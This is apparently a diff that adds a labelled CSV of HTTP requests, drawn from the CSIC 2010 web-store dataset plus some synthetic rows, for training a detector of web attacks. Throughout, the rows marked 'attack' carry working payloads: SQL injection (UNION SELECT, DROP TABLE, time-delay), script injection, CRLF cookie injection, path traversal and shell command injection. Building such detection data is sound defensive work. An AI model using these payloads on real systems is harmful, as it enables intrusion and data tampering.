@@ -1,0 +1,1001 @@
+request,label,source
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=naujoks&password=2n3o9580i432i0a6&nombre=Ant%FA&apellidos=Iturbe+Munuera&email=baotiste4%40esmeraldas.org.bg&dni=64696199M&direccion=Pl.+De+Belen+35+2E&ciudad=Fuentelencina&cp=08795&provincia=Navarra&ntc=5469681368008554&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=marcello87&pwd=mongolism_o&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=toshachany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&pwd=qUeR4N55a&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8893&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: idA=3&nombre=Queso+Manchego&precio=39&cantidad=91&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precioA=5500&B1=Pasar+por+caja,attack,csic2010
+"POST /view BODY: file=x' UnION SeLECt nULL,nuLL--",attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=brandt&password=2j2St1&nombre=Rohan&apellidos=Tinto+Higueras&email=kirov%40ofertachina.fm&dni=16601924H&direccion=C%2F+Nicolas+Salmeron+73+&ciudad=Zarra&cp=45100&provincia=Asturias&ntc=8105619729303205&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=ca%2Bri%2Bta&password=import%21ador&nombre=Leinad&apellidos=Alabart&email=koyama%40civicosdns.jp&dni=19113499Q&direccion=C%2F+Silvinita+95%2C+11D&ciudad=Cordobilla+de+L%E1cara&cp=16800&provincia=Cuenca&ntc=9775185207171671&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5350&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=69&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=85&cantidad=19&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=youping&pwd=2xorciza989&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=sultan&password=sOLLar&nombre=Heber&apellidos=Patr%F3n&emailA=fonseke_cicco%40ropadegolf.com.fj&dni=72983438E&direccion=Calle+Azofra+28+&ciudad=Baraona&cp=28694&provincia=Lleida&ntc=5423616197210085&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=15&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=serville9&pwd=en8og1da&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modoA=insertar&precio=5698&B1=Pasar+por+caja,attack,csic2010
+GET /search?name=%3B%20ls%20-la,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=myong&password=colOrISmo&nombre=Dagmar&apellidos=Cabane+Molas&emailA=holton%40enigmatico.vu&dni=91624095F&direccion=Don+Ferreol+Hernandez+S%2FN%2C+&ciudad=Calders&cp=37183&provincia=Salamanca&ntc=6035116303925311&B1=Registrar,attack,csic2010
+GET /view?comment=1 OR 1=1,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=%27+DELETE+FROM+USERS&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=kortner%40vitalhome.cl&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntc=4253633913747340&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=vrouwerf&password=ADeMa*DOR&nombre=Teodocio&apellidos=Feixas+Sarri%E0&email=vonderlinn%40coachingevolutivo.mq&dni=99068389Y&direccion=Calle+Cerrillo+Del+Hambre%2C+130+5%3FD&ciudad=Tob%EDa&cp=50213&provincia=C%F3rdoba&ntc=877103158839286A&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=fetzko&password=gauchaje&nombre=Naimi&apellidos=Artigas+Girut&email=sheffield%40ringringrent.my&dni=86274990N&direccion=Tharsis+S%2FN+11%3FC&ciudad=Collado+Villalba&cp=17740&provincia=Navarra&ntc=4085822319269290&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=thuong&password=H78N7Ce30&nombre=Hildebaldo&apellidos=Saiz&email=longo%40elbauldelosrefranes.web&dni=19482682A&direccion=C%2F+Valladolid+194%2C+6%3FB&ciudad=Garcill%E1n&cp=46891&provincia=Valencia&ntc=2473105316988907&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ricca&password=es26sa&nombre=Acacio&apellidos=Mol%E9s+Llubet&email=bervil-berkel%40boda-barata.sn&dni=96003284L&direccion=Comercio+45+&ciudad=Sobrado&cp=45950&provincia=Guadalajara&ntc=8862208467405962&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=312&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7591&B1=Confirmar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=mathurin&password=476en9o9na5&nombre=Vartan&apellidos=Altamiranda+Aragon%E9s&email=kosanovic%40discon.cg&dni=56702228Y&direccion=Orellana%2C+98%2C+&ciudad=Belalc%E1zar&cp=09258&provincia=Girona&ntc=3348558480673240&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=gaunsezl&password=cosmog%F3ni.ca&nombre=Alom%EDas&apellidos=Vicu%F1a+Munuera&email=fupimoto_kalem%40blueberryminiloaf.com.nr&dni=05672216W&direccion=Calle+Resconorio%2C+197+9%3FG&ciudad=Arroba+de+los+Montes&cp=07315&provincia=Albacete&ntc=3976106689802433&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=padiath&password=dud4a18a&nombre=Sebasti%E1n&apellidos=Dato&email=hulligan5%40beltoan.com.je&dni=87840654C&direccion=Salvador+Mundi+146+9%3FC&ciudad=Leci%F1ena&cp=46893&provincia=Huesca&ntc=2592750778275929&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=sha-wen&password=aeronato&nombre=Rudy&apellidos=Riviere&emailA=pilato0%40lettere.aero&dni=68312371W&direccion=Pl.+Ochavo+19+&ciudad=Santa+Mar%EDa+del+Campo&cp=37799&provincia=Guip%FAzcoa&ntc=7225503752888118&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar%4040&login=carolien&pwd=p68vILl7Ja6&remember=on&B1=Entrar,attack,csic2010
+POST /products BODY: name=Tom & Jerry,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=beate&pwd=esp8rtillero&remember=off%2F&B1=Entrar,attack,csic2010
+PUT /tienda1/miembros/editar.jsp BODY: modo=registro&login=maludzin&password=*hiNTeRo&nombre=Isauro&apellidos=C%F3zar+Ortega&email=knaup%40ilusionarium.by&dni=30143184M&direccion=Cerro+Animas+199%2C+8%3FG&ciudad=Bentarique&cp=08270&provincia=Teruel&ntc=5095373752411795&B1=Registrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp/4861362529278789730.BAK,attack,csic2010
+GET /products?user=admin'--,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=leanora2&password=DeS9e260aDOR&nombre=Hilario&apellidos=Bucio+Isoba&email=laroque_wilcox%40mataluenga.pk&dni=32598438D&direccion=Paseo+Salamanca+92+&ciudad=Redov%E1n&cp=44145&provincia=Zamora&ntc=0969304628186551&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=spindler1&password=TrIncha-32r1&nombre=Giuliana&apellidos=Mulet+Lichtle&email=stoeckel%40hacia.sa&dni=08363269D&direccion=Alqueria+De+Pixarroda%2C+27+&ciudad=Tossa+de+Mar&cp=09230&provincia=Salamanca&ntc=0277189059505279&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=lennard2&password=segundar&nombre=Armelio&apellidos=Gochez&email=shankley%40discon.sz%252B&dni=25054750E&direccion=C%2F+Fuente+Del+Rey%2C+S%2FN%2C+&ciudad=Gavilanes&cp=36110&provincia=Salamanca&ntc=2607422784974121&B1=Registrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=dassie&pwdA=chospar&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modoA=registro&login=marconi1&password=adularia&nombre=Venancio&apellidos=Del+Campillo+Aranda&email=blier%40ropadegolf.com.at&dni=70108873C&direccion=Paratge+Pla+18+8%3FD&ciudad=Sotorribas&cp=15391&provincia=Soria&ntc=6078216616409598&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=157&B1A=Pasar+por+caja,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=boschin&password=3189p6zada&nombre=Amadis&apellidos=Funes+Port%E9s&email=gracie%40triplectextil.me&dni=81791661G&direccion=Plza.+Beato+Andres+Hiberno%2Bn%2C+63+9A&ciudad=Pedrosillo+de+los+Aires&cp=03345&provincia=Guadalajara&ntc=1272948221132397&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=21&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precio=85&cantidad=81&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1361&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6932&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=onder&password=cORT%E9SMenTE&nombre=Pancracio&apellidos=Joves+Sagreras&email=darcy%40risiberia.gr&dni=20934634B&direccion=Pla%2Bza+Estacion+48%2C%2B+&ciudad=Santa+Croya+de+Tera&cp=13326&provincia=Zaragoza&ntc=7238071991283064&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=kolenda&pwd=0%DA7e1&remember=off&B1=Entrar%27INJECTED_PARAM,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=eriks&pwd=salSa&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=13&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=sydeman6&pwd=0nC%2FOn%2F6it%2CAr&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=bahl3&pwd=VAnGuaRDa&remember=off&B1=Entrar,normal,csic2010
+POST /contact BODY: user=python tutorial,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=chet&pwd=6r7pisonda&remember=off&B1A=Entrar,attack,csic2010
+POST /login BODY: page=../../boot.ini,attack,synthetic
+GET /scripts/tools/drvrs.exe,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=besime&password=cHAmP%E1N&nombre=Arjan&apellidos=Rebolledo+Tabernero&email=joux%40viajessolomujeres.nf&dni=24387950S&direccion=C%2F+Peru%2C+85%2C+10%3FH&ciudad=Luena&cp=46114&provincia=Palencia&ntc=2008736994858842&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=michigan&password=apulga*rar&nombre=Venancia&apellidos=Cataquet+Ciavaglia&email=reason%40cajucar.br&dni=42583172Y&direccion=Calle+Magnolia+157+&ciudad=Mart%EDn+Miguel&cp=50136&provincia=Ourense&ntc=4610658579626439&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7277&B1=Pasar+por+caja%2F,attack,csic2010
+POST /products BODY: id=hello world,normal,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2806&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=prissie&password=7u3eo&nombre=Marcelino&apellidos=Gispert&email=moriaty.suchima%40vendomiatico.at&dni=76973319R&direccion=Carrer+Puigterra+De+Dalt%2C+69%2C+&ciudad=Alcal%E1+del+J%FAcar&cp=34477&provincia=Terue%2Bl&ntc=5196721943648454&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=garv&password=exig%FCidad&nombre=Yvone&apellidos=Fortet+Esquer%E0&email=rufino%40citycvs.as&dni=91985949W&direccion=C%2F+Benimaclet%2C+46+&ciudad=Bugarra&cp=10970&provincia=Segovia&ntc=6877205573294951&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=quill&password=2u27lad9r4&nombre=Dalmiro&apellidos=Erill+Crespo&email=myers%40naturalchild.so&dni=91438020W&direccion=C%2F+Escultor+Julio+Gonzalez+88%2C+&ciudad=Amorebieta-Etxano&cp=05229&provincia=Teruel&ntc=6048554064822313&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=stouder&pwd=orea%2Fnt%2Fe&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8064any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&B1=Confirmar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=oskorep&pwd=abU%D1uelAdA&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=souren&password=P811S25&nombre=Sisebuto&apellidos=Fincias+Alcoriza&email=diccico_pastor%40a%F1o09.io&dni=80914738W&direccion=C%2F+Altamira+179%2C+&ciudad=Almaluez&cp=45789&provincia=Sevilla&ntc=1714562160313645&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precioA=2542&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=moriyama&password=chan%2Bquete&nombre=Jer%F3nima&apellidos=Zu%F1iga+Urbina&email=grandinetti%40mariposasentudia.mm&dni=69653229Y&direccion=Cruz+De+Caravaca%2C+177+&ciudad=Daimiel&cp=14970&provincia=%C1vila&ntc=4159457629727955&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modoA=insertar&precio=394&B1=Confirmar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ava8&password=0u5o&nombre=Ayar&apellidos=Traveria+Morera&email=huebing%40biosoftware.pe&dni=36563093Q&direccion=Carrer+Peru+128%2C+9%3FF&ciudad=Casas+de+Ben%EDtez&cp=10411&provincia=Le%F3n&ntc=4283457945091772&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=yudin&password=m6l2%E15eo&nombre=Solano&apellidos=Irizar+Morata&email=kimbrell%40erasmusrooms.cu&dni=08490721H&direccion=Barriada+De+La+Virgen+Del+Valle%2C+178+2-F&ciudad=Almohar%EDn&cp=46593&provincia=Toledo&ntc=6652639660879846&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=naujoks&password=2n3o9580i432i0a6&nombre=Ant%FA&apellidos=Iturbe+Munuera&email=baotiste4%40esmeraldas.org.bg&dni=64696199M&direccion=Pl.+De+Belen+35+2E&ciudad=Fuentelencina&cp=08795&provincia=Navarra&ntc=5469681368008554&B1=Registrar,normal,csic2010
+GET /tienda1/asf-logo-wide.gif/.Bak,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=hyong-ju9&password=CuidadorA&nombre=Vladimir&apellidos=Yaben+Billini&email=kempf%40gemas.org.mr&dni=71246547E&direccion=San+Francisco+De+Paula+67+11-C&ciudad=Trasobares&cp=23746&provincia=Teruel&ntcA=0763433246447327&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&loginA=cicchino&password=erin&nombre=Regino&apellidos=Cortadel+Montori&email=litja%40decoaching.cy&dni=40735914Q&direccion=Plza.+Pescador%2C+173%2C+&ciudad=Espejo&cp=15531&provincia=C%F3rdoba&ntc=9365944348061840&B1=Registrar,attack,csic2010
+GET /tienda1/asf-logo-wide.Bak,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dniA=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3245&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar%22+AND+%221%22%3D%221&precio=31&B1=Confirmar,attack,csic2010
+"POST /view BODY: comment=""><script>alert(document.domain)</script>",attack,synthetic
+GET /tienda1/miembros/salir.jsp/6909030637832563290.jsp,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=yerneni&password=%21afi2mamiento&nombre=Paulino&apellidos=Marc%E9+Chimal&email=thorntveidt%40cincocolores.museum&dni=81318789N&direccion=Sur+155%2C+8-F&ciudad=Od%E8n&cp=46890&provincia=Girona&ntc=1835703136482162&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=maiga&password=eXtremosa&nombre=Biridiana&apellidos=Olid+Seuba&email=ruick_heasley4%4018horas.ro&dni=83288994Z&direccion=Praza+General+Mola%2C+5+8%3FG&ciudad=Llosa%2C+la&cp=12414&provincia=Burgos&ntc=0852672704954562&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=oliver&password=tenuta&nombre=Nilsa&apellidos=Borrachero+Muros&email=byrska%40diagnosticoradiologico.nz&dni=31788831W&direccion=Norte+131%2C+8%3FE&ciudad=Aranc%F3n&cp=10700&provincia=Lugo&ntc=7380832792617774&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1175&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=atrc&password=amargaz%F3n&nombre=Ligia&apellidos=Baquer%F3+Prim&email=kalem%40redesmilitantes.ly&dni=12059554X&direccion=Pl.+De+Las+Americas%2C+196%2C+3%3FE&ciudad=Torrecilla+de+la+Jara&cp=41340&provincia=Cuenca&ntc=4488759151183895&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=fitch&password=libres29&nombre=Aramis&apellidos=Bellmunt+Callealt&email=frigola%40lesionesmusculares.tv%252B&dni=56967582D&direccion=Plza.+Celso+Negueruela%2C+113%2C+&ciudad=Pajares+de+los+Oteros&cp=18370&provincia=%C1lava&ntc=6708069843609931&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=kameko&pwd=08acar&remember=off&B1=Entrar,normal,csic2010
+POST /contact BODY: email=1; DROP TABLE users,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=girish&password=cribada&nombre=Casida&apellidos=Molina&email=lawlik%40housemovie.lk&dni=56546514W&direccion=C%2F+Valdepalitos+155%2C+5-A&ciudad=Galende&cp=16127&provincia=C%E1ceres&ntc=0210374082544732&B1=Registrar,normal,csic2010
+GET /tienda1/global.BAK,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=94&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=walt0&pwd=e2cr1t0c0&remember=off&B1=Entrar%4040,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=zybala&password=amarillenta&nombre=Lorenzo&apellidos=Mila+Lurhmann&email=penya%40whitepearlresort.so&dni=48010711M&direccion=San+Pablo%2C+54+4%3FH&ciudad=Granja+d%27Escarp%2C+La&cp=13410&provincia=Burgos&ntc=9664721981046844&B1=Registrar,normal,csic2010
+GET /contact?id=cheap flights,normal,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=kortekaa&pwd=7aria&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=k%3Far%2Bie&pwd=40c7c0o&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=bylina&password=6o7zo6a&nombre=Nedra&apellidos=Sanchon+Vilavend&email=saunders%40titulosoficiales.web&dni=69441548V&direccion=Marcelino+Suarez+39%2C+&ciudad=Campello%2C+el&cp=34475&provincia=%C1lava&ntc=7173154653829351&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=sattar&password=chipaco&nombre=Indiana&apellidos=Guiral+De+la+Fuente&email=rendra%40imarbella.mq&dni=46632076J&direccion=Calle+Parque+Don+Juan+Tenorio%2C+153%2C+&ciudad=Villarrubia+de+los+Ojos&cp=25442&provincia=Palencia&ntc=8364507034302440&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=ankie&password=ene0430&nombre=Protasio&apellidos=Boza&email=musgrove-mccay%40x2.com.lv&dni=41766243Z&direccion=C%2F+Las+Monjas+34%2C+4A&ciudad=Capdepera&cp=50374&provincia=Barcelona&ntc=4329593989444805&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=latin&pwd=sE1i81%C1Me885&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=771&B1=Pasar+por+caja,normal,csic2010
+POST /download BODY: user=1' ORDER BY 3--,attack,synthetic
+POST /login BODY: q=Tom & Jerry,normal,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4167&B1=Confirmar,normal,csic2010
+GET /download?file=42,normal,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=coules&pwd=vIno&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=girouard&pwd=Disgu5TAd1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=off&B1=Entrar,attack,csic2010
+"POST /search BODY: user=x' UNION SELECT NULL,NULL--",attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=juanita&password=carpetana&nombre=Horacio&apellidos=Huerta&email=lupi_ashcroft4%40hipotecascom.ls&dni=74498414B&direccion=C%2F+Arces%2C+51%2C+1%3FF&ciudad=Llutxent&cp=26215&provincia=%C1lava&ntc=9581817089306888&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4277&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=100&cantidad=26&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=jayavant&pwd=2s323a657a679&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=huboi&password=cHI5rleA8&nombre=Sartino&apellidos=Torrabas+Fabreg%E0&email=gleeson.springson%40universla.pg&dni=72818096G&direccion=C%2F+Tamarindo+170+&ciudad=Gorga&cp=10818&provincia=Tarragona&ntc=2361892920349393&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/index.jsp.inc,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8459&B1=Confirmar%2F,attack,csic2010
+GET /6909030637832563290.jsp,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=zhiyong&pwd=cha%249i74r0&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Vino+Rioja&precio=100&cantidad=1&B1A=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=tiong-ho&password=an1l5m9no&nombre=S%2Btyli-anos&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=auberon&password=c9525l2a&nombre=Leonelda&apellidos=Nadal+Ridaura&email=garvin%40ajuntamentdebcn20.ro&dni=37027899S&direccion=Calle+Valverde+De+Los+Arroyos%2C+23+&ciudad=Navales&cp=24430&provincia=Navarra&ntc=4724113161333595&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=25&B1=A%F1adir+al+carrito%4040,attack,csic2010
+GET /tienda1/miembros/imagenes/6909030637832563290.jsp~,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=lovell&password=%2Fnap%24ole%F3%2Fnica&nombre=Mardoqueo&apellidos=Zenteno+Llunell&email=gebert.vrdoltak%40intg.md&dni=55492932G&direccion=Conde+De+Las+Infantas+30+8%3FF&ciudad=Metauten&cp=10120&provincia=Madrid&ntc=6623716227816095&B1=Registrar,attack,csic2010
+POST /download BODY: email=1%27%20ORDER%20BY%203--,attack,synthetic
+POST /comment BODY: id=<script>alert(1)</script>,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=sarna5&password=%21laureando&nombre=Ledy&apellidos=Calera+Hera&email=allenbury-nantasiri%40audiosat.az&dni=02790010H&direccion=Calle+Castilleja+De+La+Cuesta+70%2C+&ciudad=T%EDrvia&cpA=03638&provincia=Girona&ntc=1446048659469569&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ghartey&password=gallar%EDn&nombre=Bernd&apellidosA=Estebane+Abitera&email=guradze1%40conac.com.dd&dni=77217080P&direccion=Plza.+De+Los+Fueros+38%2C+&ciudad=Padrenda&cp=03812&provincia=A+Coru%F1a&ntc=9300234398617894&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=vester1&password=exudar&nombre=Ignacia&apellidos=Mimendi+Calvaroso&email=emperio%40chinavende.gt&dni=79531407Y&direccion=O%27donnell+9+&ciudad=Cabana+de+Berganti%F1os&cp=21110&provincia=Barcelona&ntc=290553531661419&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=kaleena2&password=InMEMO2ial&nombre=Nazareth&apellidos=Daniel+Barquin&email=ferco-stanczak%40%40noviast%40eresapa%40lacios.kw&dni=08092387K&direccion=Glorieta+Arabial+S%2FN%2C+10%3FD&ciudad=Pedrera&cp=40314&provincia=Soria&ntc=9093119555934526&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4903&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=seiden&password=RecI%21Tar&nombre=Lucinio&apellidos=Rodrigue+Cubero&email=ekk%40furgos.com.mil&dni=07197959V&direccion=C%2F+Idris+183+&ciudad=Flores+de+%C1vila&cp=44156&provincia=Santa+Cruz+de+Tenerife&ntc=3448589549551103&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=zumel&passwordA=resalado&nombre=Wenceslada&apellidos=Bocachica+Barris&email=thebs-camoiras%40evelin.mq&dni=16612973G&direccion=C%2F+Tomas+Perez%2C+130%2C+&ciudad=Santa+Maria+de+Palautordera&cp=44593&provincia=Almer%EDa&ntc=0177727308536638&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=bernardi&password=3Uimbarda&nombre=Te%F3fila&apellidos=Palomas+Corbo&email=lamarque2%40casasdefamosos.so&dni=81322051P&direccion=C%2F+Borgo%F1a+98%2C+13-D&ciudad=Montijo&cp=50366&provincia=Cuenca&ntc=9578061450471985&B1=Registrar,normal,csic2010
